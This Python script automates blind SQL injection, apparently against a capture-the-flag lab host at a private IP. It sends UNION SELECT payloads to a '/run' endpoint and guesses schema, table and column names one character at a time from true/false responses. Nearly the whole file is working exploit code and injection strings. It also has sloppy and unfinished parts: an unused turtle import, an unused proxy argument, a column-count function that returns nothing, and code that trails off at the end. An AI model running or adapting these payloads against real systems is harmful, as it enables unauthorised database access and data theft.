from turtle import st
import requests 
import string
from concurrent.futures import ThreadPoolExecutor


def send_query(url :str , path : str , data : dict) -> str:
    print(data)
    r = requests.post(f"{url}{path}" , data=data)
    json_data = r.json()
    return json_data["message"]


def fuzz_db(url :str , path: str , burp_proxy : str ,level : int , sql_statement : str , sql_kwargs : dict = {}) -> str :
    name = ""
    chars = string.ascii_letters + string.digits + "_-@#$"

    while True:
        flag = False
        for c in chars:        
            flag = False
            temp = name + c
            sql_kwargs["temp"] = temp

            sql_payload = sql_statement.format(**sql_kwargs)
            data = {"level":level , "sql" : sql_payload}
            with ThreadPoolExecutor(max_workers=40) as executor:
                k = c
                res = executor.submit(send_query , url , path , data).result()
                print(res , temp , end="\r")
                if res == 'true' :
                    name = name + k
                    print("Schema Name : " ,name) 
                    flag = True 
                    break
            
            if flag:
                break 

        if not flag:
            break
    
    return name

def find_column(url :str , path: str , burp_proxy : str ,level : int , sql_statement : str , sql_kwargs : dict = {})-> int:
    column_count = 1
    while True:
        sql_kwargs["column_count"] = column_count
        print("trying : " , column_count , end="\r")
        s = sql_statement.format(**sql_kwargs)
        r = send_query(url , path , {"level":level , "sql":s})
        if(r == "true"):
            break
        column_count += 1


url = "http://10.10.223.28"
path = "/run"
level = 3
burp_proxy = "http://localhost:8080"
sql_schema_statement = "select * from users where username = 'nonuser' union select 1,2,3 from information_schema.schemata where schema_name like '{temp}%' and schema_name != 'information_schema'-- -"

# db_schema = fuzz_db(url , path , burp_proxy ,level, sql_schema_statement)  #sqli_three
# print("[+]Found out schema : ",db_schema)

# sql_table_statement = "select * from users where username = 'nonuser' union select 1,2,3 from information_schema.tables where table_schema='{db_schema}' and table_name like '{temp}%' -- -"

# table_name = fuzz_db(url , path , burp_proxy , level , sql_table_statement , {"db_schema" : db_schema}) #users

########################## TABLE COUNT ENUMERATION ###############################

sql_column_count_statement = "select * from users where username='nonuser' union select 1,2,3 from information_schema.columns \
where table_schema='{db_schema}' and table_name = '{table_name}' and 1 = (select if({column_count} = (select count(column_name) from information_schema.columns \
where table_schema='{db_schema}' and table_name = '{table_name}') , 1 , 4)) -- -"

db_schema = "sqli_three"
table_name = "users"
data_kwargs = {"db_schema":db_schema , "table_name" : table_name}
column_count = 1

# column_count = find_column(url , path , burp_proxy , level , sql_column_count_statement , data_kwargs)



################# TABLE ENUMERATION ###############################

sql_table_enumeration = "select * from users where username='nonuser' union select 1,2,3 from information_schema.columns \
where table_schema='{db_schema}' and table_name = '{table_name}' and column_name like '{temp}%' -- -"

removing_already_found_table = "and column_name !='{}'"
helper_query = ""

data_table_kwargs = {"db_schema":db_schema , "table_name" : table_name }

table_names = []
table_names.append(fuzz_db(url , path , burp_proxy , level , sql_table_enumeration ,data_table_kwargs))

# enumerating remaining table names
removing_already_found_table = " and column_name !='{name}' "
helper_query = ""



